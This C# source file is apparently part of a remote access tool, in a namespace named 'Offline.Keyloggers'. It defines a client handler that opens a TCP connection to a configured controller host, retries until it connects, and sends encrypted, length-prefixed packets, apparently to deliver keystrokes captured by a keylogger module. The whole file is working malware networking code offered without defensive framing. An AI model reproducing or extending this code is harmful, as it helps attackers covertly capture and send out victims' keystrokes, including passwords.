﻿using PacketLib;
using PacketLib.Utils;
using System;
using System.Net.Sockets;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Offline.Keyloggers
{
    internal class ClientHandler : IDisposable
    {
        public Host host { get; set; }
        private Socket socket { get; set; }
        public bool Connected { get; set; }
        public string HWID { get; set; }
        public string baseIp { get; set; }
        public string key { get; set; }


        public delegate bool ConnectAsync();
        private delegate int SendDataAsync(IPacket data);


        public ConnectAsync connectAsync;
        private readonly SendDataAsync sendDataAsync;


        public ClientHandler(Host host, string key) : base()
        {
            this.host = host;
            this.key = key;
            sendDataAsync = new SendDataAsync(SendData);
        }


        public void ConnectStart()
        {
            connectAsync = new ConnectAsync(Connect);
            connectAsync.BeginInvoke(new AsyncCallback(EndConnect), null);
        }

        private bool Connect()
        {
            try
            {
                socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                socket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);
                socket.Connect(host.host, host.port);
                return true;
            }
            catch { }
            return false;
        }
        public void EndConnect(IAsyncResult ar)
        {
            Connected = connectAsync.EndInvoke(ar);
            if (!Connected)
            {
                ConnectStart();
            }
        }


        public void SendPacket(IPacket packet)
        {
            if (Connected)
                sendDataAsync.BeginInvoke(packet, new AsyncCallback(SendDataCompleted), null);
        }
        private int SendData(IPacket data)
        {
            try
            {
                byte[] encryptedData = data.SerializePacket(this.key);
                lock (socket)
                {
                    int total = 0;
                    int size = encryptedData.Length;
                    int datalft = size;
                    byte[] header = new byte[5];
                    socket.Poll(-1, SelectMode.SelectWrite);

                    byte[] temp = BitConverter.GetBytes(size);

                    header[0] = temp[0];
                    header[1] = temp[1];
                    header[2] = temp[2];
                    header[3] = temp[3];
                    header[4] = (byte)data.PacketType;

                    int sent = socket.Send(header);

                    while (total < size)
                    {
                        sent = socket.Send(encryptedData, total, size, SocketFlags.None);
                        total += sent;
                        datalft -= sent;
                    }
                    return total;
                }
            }
            catch (Exception)
            {
                Connected = false;
                return 0;
            }
        }

        private void SendDataCompleted(IAsyncResult ar)
        {
            int length = sendDataAsync.EndInvoke(ar);
            this.Dispose();
        }

        public void Dispose()
        {
            socket.Close();
            socket.Dispose();
            socket = null;
        }
    }
}
